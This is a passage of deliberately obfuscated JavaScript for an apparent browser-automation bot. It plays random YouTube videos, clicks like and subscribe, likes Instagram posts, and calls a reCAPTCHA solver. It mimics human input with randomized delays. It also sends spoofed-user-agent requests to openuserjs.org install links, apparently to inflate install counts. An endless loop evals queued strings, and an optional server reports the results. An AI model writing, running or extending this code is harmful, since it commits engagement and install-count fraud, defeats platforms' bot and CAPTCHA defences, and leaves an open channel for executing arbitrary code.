                for (let a5 = 0x6ac + 0xbd7 + 0x1 * -0x1283; a5 < a3['length']; a5 += -0x2 * -0x10cb + -0x148 + -0x204c * 0x1)
                  a4 += a3[a5] * Y[a3[a5 + (0x1c6d + 0x2283 + -0x3eef)]];
                return a4;
              }(a1);
          });
          await u('#__hookedV' + 'idToClick', 0x23e * 0x3 + -0x1229 + 0xb6f * 0x1, V);
          let X = min((0x1555 * -0x5 + 0x5 * -0x3bf + -0x2 * -0xb3e2) * getRandomInt(-0x1ea3 + -0x29 * 0x47 + 0x2a03, 0x23ee + 0x125a + 0x6a * -0x83), W + (-0xb7 * -0x2e + 0x2 * -0x114d + -0x220 * -0xa));
          return log('watching\x20v' + 'ideo\x20for\x20' + X + 'ms'), await wait(X), 0x1b55 + -0x14a4 + -0x6b0;
        }
        const D = [
          'eHpl-BjXo5' + '8',
          '-PgyODlV6V' + '8',
          'S9EkXX0QYD' + 'U',
          'WvcG1OKdHW' + 'o',
          'b6gOcEwtZ8' + 'U',
          'apdtzA0Dzf' + 'k',
          'YiukDwYv2K' + '4',
          'zK-6UH5R5X' + '8',
          'bIXqNjtsEf' + '4',
          '3l253rESkw' + 'Q',
          'u6RVZKcN9z' + 'Q',
          '6ImZdwpdwT' + 'A',
          '0qPB5ANSBK' + 'c',
          '92duH3cqn1' + 'M',
          'b5lKI78fw3' + 's',
          'zpCCPZfP8L' + 'I',
          'ES7oooakr-' + 'c',
          '2eWyJ8FBvQ' + '8',
          'O4-B3OFPDf' + 'Q',
          'JFcnGk0_u7' + 'o',
          'AP7d2Ghq6d' + 'U',
          'UizEAwrZAG' + 'I',
          '0FAi5-h8Hj' + '0',
          'CNqA6IYj17' + 'k',
          'tSiKyCpwnS' + 'Y',
          'OrglyeV5xP' + 'Y',
          'BXkB-g4eCc' + 's',
          'Y53CmmpbOJ' + 's',
          'sm5MLz_IrQ' + 'k',
          'EuciRU_Ska' + '0',
          'cCbDCTLyPc' + 'E',
          'Ox7Ng5T7bm' + 'c',
          'TXTaB-dQg-' + '0',
          '3jSWaWgr_A' + '0',
          'xT8nvuxCRB' + 'E',
          '3c4Ab9EmRg' + 'Y',
          '2kScgeNOpL' + '8',
          't22jhowMom' + 'c',
          'HbcDLgkmXL' + 's',
          'JsKZ41uTeg' + 'c',
          'dfU48FRgs0' + 'g',
          '3K9ILewnUk' + 'o',
          'QmKwnRiKhD' + 'k',
          'n3nVsWsL6I' + 'k',
          'noTs52D_Mw' + 'Y',
          'A0tDR4nTTK' + '0',
          '9eBwFca-B1' + '4',
          'moasU30H5l' + 'A',
          '_Mb8oQtSBW' + 'E',
          'TNGGOgwPtc' + 'M',
          '-pYA-gjkQ8' + 's',
          '5d-dB6tZZA' + 'o',
          '8H2AiOV0oE' + 'o',
          'mI7aiKDGde' + 'w',
          'D-IMDYrj35' + '4',
          aC(0x6) + 'g',
          'mjVwfjJ2nj' + 'k',
          '6auDBi-D2H' + 'M',
          'X89-SWNdIE' + 'k',
          'T5Pn4LhIwj' + 'M',
          'wVnKGSjY3i' + '8',
          'g11NJftxw1' + '4',
          '9zHirkfEKk' + 'k',
          'ZyGS_AMbIa' + '4',
          'yG6bwB17ZP' + 's',
          'aytHiLe0s6' + 'U',
          'cGe-Mpw_F1' + 'w',
          'eMK7xV_nxZ' + 'o',
          'epJ2MAKa1Y' + 'Q',
          '5BNbKKMUhE' + 'o',
          'oxpAvc6tDP' + '8',
          'jRcc-NIR2R' + 'I',
          '258btO4mFw' + '4',
          'pXjJAUvSbQ' + 'A',
          '63-irfPjh2' + 'c',
          'xbrDZAFf3Q' + 's',
          'MVHMtRlesU' + 'g',
          'zed05qfHMB' + 'I',
          'nkhkxKUHsY' + 'g',
          'n4cSAqR9H1' + 'Q',
          'gOUPndcj7z' + 'I',
          'n3HBTTDHoX' + '8',
          'XIgMFHPIXv' + '4',
          'oQHKMky-_K' + 'c',
          'zfDgTzZ2nh' + '0',
          '1PYettRo-D' + 'M',
          'jzuZuwF490' + '4',
          '2DAgWTlXae' + '8',
          'keouUYA5hI' + 'k',
          'F7i7wRlGCd' + 'c',
          'uToD2c0CdJ' + 'c',
          aD(0x19) + '8',
          '-rrH657DAa' + 'o',
          'QTrEEWtDks' + '4',
          'TWTSnQDuad' + 'Y',
          'a0GUyvgnzg' + 'c',
          'eSReWZQyKd' + 'E',
          'D_5pMqdKSs' + '4',
          'm0ie8gHS00' + 'I',
          '6WosqMq9ej' + 'o',
          'i0afAOlon_' + '4',
          'j_fe6PfxW4' + 'Y',
          'GfPzi8SYr0' + 'w',
          'MSgZhNCwff' + 'M',
          'wxyBC_z6bI' + '8',
          'PkQpV-Fwhs' + 'k',
          'bVD6cWOVhN' + 'U',
          'mjZOpQlHbx' + 'M',
          'k_BXkcdbBO' + 'M',
          'X72oUsFV7q' + '0',
          'lONsILfq-W' + 'Y',
          'Bhe9PyM_s_' + 'Q',
          'Bhe9PyM_s_' + 'Q',
          'h4TBnDkX4y' + 'o',
          'PNBJyHEkfk' + '4',
          'L3iHS__ufc' + 'g',
          'm7aliUAwm_' + 'Y',
          'FuPVf85zMi' + 'w',
          'gtupAeNTDS' + 'M',
          'yyJ8zkckoB' + '8',
          'ZDTESiN1eS' + 'w',
          'Fo6x16DkoR' + 'o',
          'IAJqRxhVqO' + 'k',
          'KAgwII8TGj' + 'o',
          'o4tLCshmlb' + 'M',
          'dLj5fIupdA' + 'o',
          '_Xl_-b9P4U' + 'Q',
          'V3NxxpUUfW' + 'E',
          'J3ygeDEMnO' + 'w',
          'HcP_xmdwsl' + 'c',
          'M9g0h7px2_' + 'M',
          'b5WfUvcSgr' + 'U',
          'JGHnIshsoC' + 'E',
          'x2gfhCLHd9' + '4',
          'M5Fr8G0ma9' + 'o',
          '3sGeIBfFlC' + 'M',
          'k74y4KOJ2m' + '4',
          'pTHJB0S8E-' + 'U',
          'KaIrXJLfYP' + 'M',
          '0cisZkywhg' + 'Q',
          '0dVzItbl9E' + 'w',
          't0EqnhcSb1' + 's',
          'MuiXtvo1RY' + 'E',
          'Nj-3KC6knH' + 'w',
          'B19HbETNi5' + '8',
          'yKN_QkroH6' + 's',
          'U9ExFM1pji' + '0',
          'sONzDfjKhL' + '4',
          'n3Kj8zEfew' + 'U',
          'nXLGQ7QeoG' + 'Y',
          'OQFQiwiM-P' + 'Y',
          'UtPRpKRTtH' + 'U',
          'E56Myp0BzE' + 'E',
          '7DjOp_JM2Z' + 'w',
          'rNFLQFz_G1' + 'g',
          '1r2pKoVAdj' + 'M',
          'gm3eiv6UND' + 'M',
          'yOiROfjxzX' + 'o',
          'lt2AcxC_ap' + 'g',
          'bObEme2BDO' + 'E',
          '6Ut6HbJmW4' + 'w',
          'fUs0TtQQTo' + '0',
          '_phHS3FAgW' + 'Q',
          '1f8sU4l3dP' + '4',
          'HwTSLUd53K' + '8',
          'EpP2ymD_QG' + 'A',
          'TQ69QFqmbo' + 'I',
          'wA8BqUka_u' + '0',
          'bc8Ey-vuR5' + 'M',
          'PZ_uLi7ULl' + '0',
          aE(0x7, 'Qz[i') + '4',
          'dv1JluwoOb' + 'c',
          'nHotP0jbcv' + 'A',
          'iIjYNEmrVv' + 'M',
          'SeP-OZAiPb' + 'c',
          'v52PClvMFt' + 'k',
          '3loLqIPxTS' + '0',
          'jVu9mOzbSq' + 'U',
          '73SAN1vOrV' + 'k',
          'YLPxp4ntym' + 's',
          'YWXfelRk3b' + 'Q',
          'CsxlLMb6Uj' + 'o',
          'uafGOfwzpa' + 'Q',
          'XIr8qotHOI' + 'E',
          'EcoPCWC3Uh' + 'o',
          'AhOwyT8aIh' + 'g',
          't-Ox7lI5UH' + 's',
          'i08qNmssXe' + 'Q',
          'QrJIU09eD-' + 'g',
          'QvNNCQ-8Rp' + 'E',
          'k5gjnjDFAZ' + 's',
          'h_NQ3y1ek8' + 'U',
          'evPsJlNLy_' + '4',
          'qEPTydgwh4' + 's',
          'LB685ckhuf' + 'E',
          'Lj1EcSMGey' + '0',
          'OE19r7MIMW' + 'Q',
          'u8E3p0Vy-P' + 'Y',
          'f4a5OPFQa7' + 'k',
          'XDo7Q7yUEt' + 'k',
          'Vw_9zw0qHI' + 'c',
          'KGT5nbDsI_' + '8',
          'E008Eql59M' + 'Q',
          'wSOFdefX47' + 'A',
          '2xcv7q3QhR' + 'E',
          'hgfvmcBkc0' + '4',
          '0wP7csnX7k' + '4',
          'Xo0R8WiRSb' + '4',
          '8zNp8EOpGd' + '4',
          'sWYhIJZmoS' + 'E',
          'YdG8U1W-bX' + '0',
          'QeDsoSNml-' + 'c',
          'xW5q77El0x' + '8',
          'ZF14issJFE' + 'Y',
          'TRglEGLLKX' + 'o',
          'UE0SXc5k1e' + 'g',
          '6VY65D8f3D' + 'Q',
          'Iwxuob4fA8' + 'Q',
          'M4elJHCUIi' + 's',
          'GY9WWhO504' + 'k',
          'eErUSxmLDw' + '8',
          'ITQfAfzLj3' + 'I',
          'vbDrCL2FuL' + 'g',
          'KyQ_sUgtbK' + 'U',
          'lbEJcipUp8' + 'I',
          '2SqCn2LreN' + 'g',
          '1i-G2TUn41' + '0',
          's0ru6uK7vi' + '8',
          'gOxiE5UAAD' + 'w',
          'lx1rOOjekc' + '8',
          '5VYN2zA-Si' + 'k',
          'q9rLWEAzoo' + 'k',
          '4KSm3IY7Xz' + 'g',
          'fMqRu_ON-D' + 'E',
          'GfvShU6Sy9' + 'A',
          'OHzOmi1b60' + 'Y',
          'D9oTUKT-_n' + 'A',
          '_BrT2PlUiw' + '0',
          'kuuI4LzKgm' + 'I',
          aD(0x1e) + 'M',
          'mi0nGt2B-q' + 'o',
          'HaI7BjnwnO' + 'c',
          'xlAEOkIuy7' + 'Y',
          '3VmtckvTXl' + 'U',
          'ed7TWHKDr4' + 'E',
          '2LfTjyVtbf' + 'U',
          'STHlCkloyv' + 'E',
          '-BI_-6YnM6' + 'Y',
          'LSK_G1qCQw' + 'M',
          '4tzqIl6EKV' + 'k',
          '9DshU55EiV' + '8',
          'mBtaEI_6e8' + 's',
          '960lvuduwY' + 'w',
          'XWJH-6J5Ee' + 'g',
          'XLS4qmyCAX' + 'g',
          '8cJDYeRiLn' + 'k',
          'cCaIVrltHz' + 'w',
          '8X2fF4pgM0' + 'E',
          '6s8Xm4wylr' + '4',
          'eFceshvavn' + 'o',
          '2h4g7euqR-' + 'U',
          'ujiBqXnn92' + '8',
          'w9F2NST-9j' + 's',
          'w-oc7F5Mmy' + 'U',
          'UYrmqL3cOD' + 'U',
          '4QB59etj0I' + 'o',
          'MY9MTNgXcN' + 'o',
          'ISBmcKDS5C' + '8',
          'ogIb7A7tvW' + '0',
          '-L583IZF6s' + 'k',
          'NbeKQq29ZL' + '0',
          'SPplDxd74F' + 's',
          'MHGV8QmpAz' + 'k',
          'iWzezFWpU7' + 'A',
          'NNCQt1rXXE' + 'Y',
          'bcb_ZhJJK8' + 'g',
          '3KoZGQiY6N' + 'o',
          'aSaXQH8F1_' + 'A',
          'V5nMOhI62o' + 'w',
          'JvlPjRUdId' + '0',
          '2gQHuClLCb' + '0',
          '5e-qDy-uUJ' + 'E',
          'oE8vC0QEWU' + 'E',
          '7cQken99yu' + 'o',
          'pmzu080j7r' + 'I',
          'sVy9F4whP6' + 'o',
          'MJrkylk7iE' + 'c',
          'XYjsTxi6oE' + '8',
          'mKlMouB6tp' + '0',
          'o2yunZQley' + 'A',
          'oRryU9F9Lv' + 's',
          'uzzK-052H0' + 'c',
          'VSvA4rCe-4' + 'M',
          'XURH2u_0fM' + 'I',
          'yfpVL2g_tk' + 'o',
          'AuEEjQ8x9o' + 'w',
          'wWkviY8zBr' + 'c',
          'zt_eubHWhx' + 'c',
          'O_7_BGU3u_' + '0',
          'QFDKBxmOn3' + 'Y',
          'w6gccNWXXv' + 'g',
          'VdNJxbrqdX' + 's',
          'wbi5Dxebvn' + 'I',
          'XEFOREYrJg' + 'k',
          'I2rcRta7WJ' + '0',
          'OP5KGfXHX_' + 'A',
          'w2MUMbbwlm' + 'o',
          'X3bF0nd6kf' + 'w',
          'WDDAhASf9j' + 'w',
          'fRwcV8gjbc' + 'w',
          '7T63gaRThr' + '0',
          'zC8AWIwhbf' + 's',
          'JSkVE0n-ee' + 'o',
          'qiQA5pWWRt' + 'U',
          'QdXCjZtfXu' + 'c',
          'vlBji8TOax' + 'o',
          'pBx_5CbIcp' + 'o',
          'L1Oy5F6ZMO' + 'Q',
          'P0NjLaBed-' + 'E',
          'DR16C4-keB' + '0',
          'LGmpIpu9eD' + 'w',
          'rNkX_A4kBA' + 'Q',
          'QztVMjrEk4' + '0',
          'uOM6m6KL5d' + '4',
          'g-Aju8xrrO' + 'E',
          'DfkDbFk_x9' + '8',
          'Y4NLDaowD6' + 'I',
          'ALSZnqQTuJ' + 'o',
          'xUmB6BpZBE' + 'w',
          'SxNOcZ1s85' + '8',
          '-noeCjO416' + 'k',
          'taPJqXBI8V' + 'Y',
          'YxqbkMi1Is' + '4',
          'vnJTyve2r-' + '4',
          '44lRVYQ38E' + 'Q',
          'QOv1N1X5J-' + 'g',
          'jNjREs7ODT' + 'g',
          'U30ToJo3dd' + 'k',
          'rm7lNIIOQC' + 'Y',
          'mGU6sOPlYv' + 'c',
          '6pwxUXdt6T' + 'Q',
          '6MkJRee35a' + 'Q',
          'LVbf7U9WAI' + 'c',
          'gPbhFvEeJ3' + 'M',
          'LWXAxz0MiH' + 'A',
          'L0KQJqfwJJ' + 'Y',
          'GWr33_u0VK' + 'c',
          '4ud3ZPfWkH' + 's',
          'dxSrySC4XM' + 'c',
          'iIM2KZC69W' + '0',
          '8DuJ3BAwME' + 'o',
          'm3BAhe1wsl' + 'Y',
          '02U_3pAZxM' + '8',
          '0e7nidPa97' + 'g',
          'TixW__6Eer' + 'o',
          'q46W8MTRTC' + 'E',
          'Jdxp04Je1O' + 'w',
          'HfP4TO3gfN' + '0',
          '4dUJaeB0qL' + '8',
          'xnL-fRJ3RZ' + 'o',
          'yJbD0Df45u' + 'Q',
          '-pGw8RkSSB' + 'k',
          '7cy86Njsis' + 'M',
          'jbgqvxtauo' + '4',
          'N8M00JjSVI' + 'I',
          'MfR5q6Td3R' + 'c',
          'eHwcx94wcp' + 's',
          'olDgVFgAgP' + 'o',
          'eAAd5BmzXz' + 'M',
          'xgTjQ2sGXd' + '4',
          'ipny6JUbzw' + 's',
          'WOwQ0UxbRj' + '4',
          'h0PKFed2GB' + 's',
          'JxdOrgzq7Z' + '8',
          '-VgpSWWW-8' + 'w',
          '-ix4OizkAn' + 's',
          'd3CRE9y3YV' + 's',
          '4QZlfXxorJ' + 'o',
          'YlDpg8aCs5' + 'M',
          'Qe5WT22-AO' + '8',
          'b_rjBWmc1i' + 'Q',
          '9yjZpBq1XB' + 'E',
          'hPx-RiBKXt' + 'Q',
          'UMqLDhl8PX' + 'w',
          'DlJEt2KU33' + 'I',
          'BWeqoARup-' + 'Q',
          '2Dx76lD8Sc' + 'c',
          'j_nI6G3ZDi' + 'E',
          'zvcUYYN1sx' + 'w',
          'cWRkYo1S3L' + '4',
          'cWRkYo1S3L' + '4',
          'bxC_PN3SRv' + 'I',
          '94m93T_5JL' + 'M',
          'RBSHAH4iWU' + '8',
          'RBSHAH4iWU' + '8',
          'RBSHAH4iWU' + '8',
          'bo9fTeXvSi' + 'A',
          'z6LqXiAK-8' + '0',
          '5tbOspjJ5f' + '0',
          'twQ6kKjtBk' + 'Y',
          'Ig17K38Fy0' + 'Y',
          'ZdlrVDwn_a' + '4',
          'aCT4Lddunx' + 'g',
          'acAvMGQtln' + 'M',
          '8XkcbdSRdO' + '0',
          '0e3GPea1Ty' + 'g',
          'zxYjTTXc-J' + '8',
          '9bqk6ZUsKy' + 'A',
          'plSyrHqUh7' + '8',
          'HkvQywg_uZ' + 'A',
          'lADBHDg-Jt' + 'A',
          'I2O7blSSzp' + 'I',
          'kd2KEHvK-q' + '8',
          'CbUjuwhQPK' + 's',
          'fb7T1v_VHp' + 'E',
          'SpeSpA3e56' + 'A',
          'RQdxHi4_Pv' + 'c',
          'nx2-4l4s4N' + 'w',
          'tUTCq3iiw_' + '4',
          'VDa5iGiPgG' + 's',
          'S-sJp1FfG7' + 'Q',
          aC(0x15) + 'Q'
        ];
        async function E(V) {
          await V['goto']('https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + D['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y')), await u('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill', -0x203d + 0x2104 * -0x1 + 0x4142, V), await u('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill', -0x3f7 + -0x11c6 + 0x15be, V);
          const W = setInterval(async () => {
            log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await V['evaluate'](() => {
              setTimeout(() => {
                document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on') ? .['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
              }, 0x7a8 + -0x11a * 0xb + -0x102e * -0x1 + (0x7c9 + -0xc * 0x18b + 0xea3) * Math['random']());
            });
          }, 0x1b00 + 0x3ea * -0x5 + 0x2 * 0x9f5);
          await wait(-0x265 * 0x10c + 0x487f5 * 0x2 + 0x1 * -0x1fa4e);
          try {
            V['$']('#__lllll') && await u('#__lllll', -0x77d + -0x73 + 0x1 * 0x7f1, V);
          } catch (X) {}
          return await wait((0x11985 * -0x1 + 0x943 * -0x2 + 0x2166b * 0x1) * getRandomInt(0x1 * -0xc74 + -0x12f5 + -0x1 * -0x1f6d, 0xbbd + -0x871 * -0x1 + -0x1415)), clearInterval(W), 0x474 + -0x1e7 + -0x1 * 0x28c;
        }
        const F = [
          C,
          A,
          B,
          E
        ];
        async function G() {
          return await wait(0x1df * 0xc + -0x8 * 0x180 + -0x9ac + (-0x105 * -0x12 + 0x3 * 0xcaa + -0x3790) * random()), -0x1beb + -0x21f4 * -0x1 + -0x608;
        }
        async function H(V, W, ...X) {
          let Y = [];
          ! function a1(a2) {
            Y['push'](a2);
            for (const a3 of a2['childFrame' + 's']())
              a1(a3);
          }(V['mainFrame']());
          const Z = 'qkdjuqwyhd' + 'uqjidwqdjq' + 'hn' + GSI++,
            [a0] = await Promise['race'](Y['map'](a2 => setWait(a2, W, X, Z)));
          return await a0['$']('.' + Z);
        }
        async function I(V, W, X = -0xb43 + 0x235f + -0x181b) {
          '_click' === W ? await p['simClickEl' + 'ement'](V) : '_view' === W ? await p['simMouseMo' + 'veToElemen' + 't'](V) : await J([
            'type',
            W
          ]), X && V && await V['dispose']();
        }
        async function J(...V) {
          const aG = c,
            aF = b;
          for (let W of V)
            if ('object' == typeof W) {
              const X = W['slice'](0x1219 + -0x90b + -0x90d),
                Y = W[-0x23e7 + 0x2362 * 0x1 + 0x1 * 0x85];
              switch (log('[DEBUG]\x20Ex' + 'ecuting\x20ac' + 'tionType:', Y, 'with\x20argum' + 'ents:', X), Y) {
                case 'waitfunc':
                  {
                    const [Z, a0] = X;
                    await a0['waitForFun' + 'ction'](Z);
                  }
                  break;
                case 'waitsel':
                  {
                    const [a1, a2] = X;
                    await a2['waitForSel' + 'ector'](a1);
                  }
                  break;
                case 'type':
                  await p['simKeyboar' + 'dType'](X[0x1690 + -0x38 * 0x11 + -0x648 * 0x3]);
                  break;
                case 'stype':
                  {
                    const a3 = X['shift'](),
                      a4 = X['shift'](),
                      a5 = X['shift'](),
                      a6 = await H(a4, a5, ...X);
                    await I(a6, a3, -0x223e + -0xff6 + 0x3235 * 0x1);
                  }
                  break;
                case aF(0x24, '4W!8'):
                  {
                    const a7 = X[0x219a + -0x6b * 0x2f + 0x1 * -0xdf5];
                    await hoist['solveRecap' + 'tchaV2'](a7);
                  }
                  break;
                case 'sclick':
                  {
                    const a8 = X['shift'](),
                      a9 = X['shift']();
                    await J([
                      'stype',
                      '_click',
                      a8,
                      a9,
                      ...X
                    ]);
                  }
                  break;
                case 'sclick-nav':
                  {
                    const [aa] = X,
                    ab = aa['waitForNav' + 'igation']();
                    await J([
                      'sclick',
                      ...X
                    ]),
                    await ab;
                  }
                  break;
                case 'view':
                  {
                    const ac = X['shift'](),
                      ad = X['shift']();
                    await J([
                      'stype',
                      '_view',
                      ac,
                      ad,
                      ...X
                    ]);
                  }
                  break;
                case 'randomdown':
                  {
                    let [ae, af] = X;
                    af ? ? = -0x1b68 + 0x25b1 + 0xa49 * -0x1 + 0.3;
                    for (let ag = ae; ag-- && (await p['simKeyboar' + 'dPress']('ArrowDown'), !(random() <= af));)
                      await G();
                  }
                  break;
                case 'enter-nav':
                  {
                    const [ah] = X,
                    ai = ah['waitForNav' + 'igation']();
                    await J('enter'),
                    await ai;
                  }
                  break;
                case 'click':
                  {
                    const [aj, ak, al] = X;
                    await latestHoist['clickSelec' + 'tor'](aj, ak, al);
                  }
                  break;
                case 'ifclick':
                  {
                    const [am, an, ao] = X;
                    let ap = await ao['$'](am);
                    ap && await hoist['clickSelec' + 'tor'](am, an, ao);
                    try {
                      ap ? .['dispose'] ? .();
                    } catch (aq) {}
                  }
                  break;
                default:
                  warn('No\x20action\x20' + 'found\x20for\x20' + W[0x1 * -0x35f + -0x28 * -0x4a + -0x2bb * 0x3]);
              }
            } else {
              const ar = W['split'](',\x20');
              await G(), log('[DEBUG]\x20Ex' + 'ecuting\x20sc' + 'riptlet\x20ty' + 'pe:', ar);
              let as = 0x471 * -0x2 + -0x1b26 + 0x1 * 0x2408;
              for (let au of ar) {
                switch (log('[SNIP' + as++ + (']\x20Executin' + 'g\x20step:\x20[') + au + ']'), au) {
                  case 'j':
                    await G();
                    break;
                  case aG(0xf):
                    await p['simKeyboar' + 'dPress']('Tab');
                    break;
                  case 'enter':
                    await p['simKeyboar' + 'dPress']('Enter');
                    break;
                  case 'down':
                    await p['simKeyboar' + 'dPress']('ArrowDown');
                    break;
                  case 'up':
                    await p[aG(0x4) + 'dPress']('ArrowUp');
                    break;
                  case 'space':
                    await p['simKeyboar' + 'dPress']('Space');
                    break;
                  case 'esc':
                  case 'escape':
                    await p['simKeyboar' + 'dPress']('Escape');
                    break;
                  default:
                    warn('[WATCHDOG]' + '\x20Failed\x20cm' + 'd\x20catch', au, ar);
                }
                await G();
              }
            }
          return -0x60 * -0x58 + 0x58e * 0x2 + -0x2c1b;
        }
        async function K(V) {
          return Check['inst'](V, Page), await V['keyboard']['down']('ArrowDown'), await wait(getRandomInt(0x1492 + -0x12b3 + 0x79, -0xd * 0x5 + 0xbff * 0x1 + -0x132)), await V['keyboard']['up']('ArrowDown'), await wait(getRandomInt(0x95 + 0x623 * -0x5 + 0x6 * 0x5ab, 0x1 * -0x1e6d + 0x6a7 + -0x43 * -0x9e)), -0x1 * -0x1e43 + -0x641 + 0x1801 * -0x1;
        }
        async function L(V, W) {
          const X = generateUniqueClassName();
          await W['evaluate'](Y => {
            let Z = [...document['querySelec' + 'torAll']('svg')]['find'](a1 => a1['innerHTML']['includes']('<title>Lik' + 'e</title>') && 'Like' === a1['getAttribu' + 'te']('aria-label') && window['__toolkit']['smartEleme' + 'ntVisible'](a1)),
              a0 = Z['className']['baseVal'];
            Z['className']['baseVal'] += ('' === a0 ? '' : '\x20') + Y;
          }, X), await V([
            'click',
            '.' + X, -0x1 * -0x1c6d + 0x11f9 * -0x2 + -0x2 * -0x3c3,
            W
          ]);
        }
        async function M(V) {
          await V['goto']('https://ww' + 'w.instagra' + 'm.com/', gotoOpts), await V['waitForFun' + 'ction'](() => {
            try {
              return document['querySelec' + 'torAll']('article')['length'] > -0x5 * 0x5f2 + 0xe * -0x251 + 0x3e29;
            } catch (W) {
              return 0x7 * -0x21a + -0xc2 * -0x29 + -0x105c;
            }
          });
        }
        async function N(V) {
          await V['keyboard']['down']('ArrowDown'), await wait(getRandomInt(-0x5 * 0x1b + 0x1b7 * -0xa + -0x7d * -0x29, 0x1 * 0x334 + -0x1 * 0x2101 + 0x3 * 0xd73)), await V['keyboard']['up']('ArrowDown'), await wait(getRandomInt(-0x1 * 0x73d + 0x10be + 0x1 * -0x599, -0x1 * -0x11b3 + 0x2 * 0x895 + -0x1149)), await L(J, V);
        }
        async function O(V) {
          return await V['evaluate'](() => {
            window['__toolkit'] = {
              'isElementVisible' (W) {
                try {
                  return null !== W['offsetPare' + 'nt'];
                } catch (X) {
                  return -0x106 * 0x1d + 0x25f * 0x8 + 0x2 * 0x55b;
                }
              },
              'smartElementVisible' (W) {
                try {
                  if (!W || !W['getClientR' + 'ects']()['length'])
                    return 0x1724 + 0x290 * 0x9 + 0x2 * -0x171a;
                  const X = getComputedStyle(W);
                  if ('none' === X['display'] || 'hidden' === X['visibility'] || '0' === X['opacity'])
                    return -0x4 * -0x35c + -0x1b45 + 0xdd5;
                  const Y = W['getBoundin' + 'gClientRec' + 't']();
                  return Y['top'] >= 0x17 * -0x199 + -0xc3e * -0x3 + 0x5 && Y['left'] >= 0x970 + -0x19a7 + -0x7 * -0x251 && Y['bottom'] <= (window['innerHeigh' + 't'] || document['documentEl' + 'ement']['clientHeig' + 'ht']) && Y['right'] <= (window['innerWidth'] || document['documentEl' + 'ement']['clientWidt' + 'h']) ? 0x146 + 0x1c28 + -0x1d6d : 0x2 * 0xc6d + -0x1347 + -0x593;
                } catch (Z) {
                  return -0x11f3 * 0x1 + -0x1 * 0x77f + -0xcb9 * -0x2;
                }
              },
              'extractLinks' (W) {
                const X = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
                let Y, Z = [];
                for (; null !== (Y = X['exec'](W));)
                  Y['index'] === X['lastIndex'] && X['lastIndex']++, Y['forEach']((a0, a1) => {
                    -0x105b + 0x9b * 0x16 + -0x2 * -0x185 === a1 && Z['push'](a0);
                  });
                return Z;
              }
            };
          });
        }
        log('browser\x20la' + 'unched');
        let P = 0x104 * -0x15 + -0x1107 + 0x265b;
        const Q = R['length'],
          R = [
            async function() {
              const V = await w('https://ww' + 'w.youtube.' + 'com/');
              let W = 0x1 * 0x171d + -0x2d4 * 0x1 + -0x9 * 0x241;
              if (await V['goto'](data['mediumArti' + 'cles']['random'](), {
                  'timeout': NETWORK_PATIENCE
                })['catch'](X => W++), !W) {
                await randomWait();
                for (let X = -0x1c24 + -0x22 * 0x65 + 0x298e; X < getRandomInt(-0x1520 + -0x421 + 0x1942, 0x5 * 0x2f5 + 0x1 * 0x17b7 + 0x1 * -0x267b); X++)
                  await p['simKeyboar' + 'dPress']('ArrowDown'), await randomWait();
                await randomWait(), await wait(0x1 * 0x138bb + -0xc30 * 0xa + -0xd * -0x359), await V['close']();
              }
            },
            async function() {
              const V = await w('https://ww' + 'w.youtube.' + 'com/');
              let W = -0x14fd * 0x1 + 0x1fbb * 0x1 + -0xabe;
              const X = getRandomInt(0x1f6 + 0x15 * 0x19c + 0x1 * -0x23bd, -0x1cb + 0x3 * 0x5ad + -0xf2f);
              for (; W < X;) {
                try {
                  await x(V), await F['random']()(V);
                } catch (Y) {
                  log(Y), await V['goto']('https://ww' + 'w.youtube.' + 'com/');
                }
                W++;
              }
              return await V['close'](), -0x5d2 + 0x26a1 + -0x20ce;
            }
          ];
        for (;;) {
          try {
            const V = f['length'] ? f['shift']() : R[P++ % Q];
            'string' == typeof V ? g = await eval(V) : await V();
          } catch (W) {}
          await wait(0xf7 + 0xfb7 + -0xa * 0x147);
        }
      }
      if (flags['doCreateSe' + 'rver'] && require('http')['createServ' + 'er'](async function(X, Y) {
          '/latestev' === X['url'] ? (Y['writeHead'](0x1cb6 + -0x540 * 0x7 + -0x8d2 * -0x1), Y['end']('$' === g ? g : '$' + g)) : (Y['writeHead'](0xc * -0x10f + -0x33 * 0x2e + 0x16a6), Y['write']('v0.8'), Y['end']());
        })['listen'](process['env']['PORT'] || 0x3ec3 + 0x92 * 0x44 + -0x45fb), flags['doOUJS']) {
        const X = 'https://op' + 'enuserjs.o' + 'rg/';

        function Y(a1, a2 = -0x871 + -0xc * 0x25c + 0x24c2 * 0x1) {
          if (a1['includes']('Firefox'))
            return a1['slice'](a1['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1cf6 + -0x1c95 * -0x1 + 0x6 * -0x997));
          const a3 = a1['indexOf']('Chrome/') + 'Chrome/' ['length'],
            a4 = a1['slice'](a3),
            a5 = a4['slice'](0xa * 0x2c + 0x7 * -0x2b4 + -0x3 * -0x5bc, a4['indexOf']('\x20'));
          return a2 ? a5['slice'](-0x1 * -0x11c3 + -0xaa9 * 0x2 + 0x38f, a5['indexOf']('.')) : a5;
        }

        function Z() {
          const a1 = data['oujsUAs']['random']();
          return [
            a1,
            a1['includes']('Firefox')
          ];
        }
        async function a0() {
          const aH = c,
            a1 = data['oujsToAssi' + 'st']['random'](),
            a2 = a1['replace']('/scripts/', '/install/') + '.user.js',
            [a3, a4] = Z(),
            a5 = Y(a3),
            a6 = {
              'signal': AbortSignal['timeout'](0x4152 + -0x6d * -0x59 + -0x4027),
              'headers': {
                'host': 'openuserjs' + '.org',
                'origin': 'https://op' + 'enuserjs.o' + 'rg',
                'user-agent': a3,
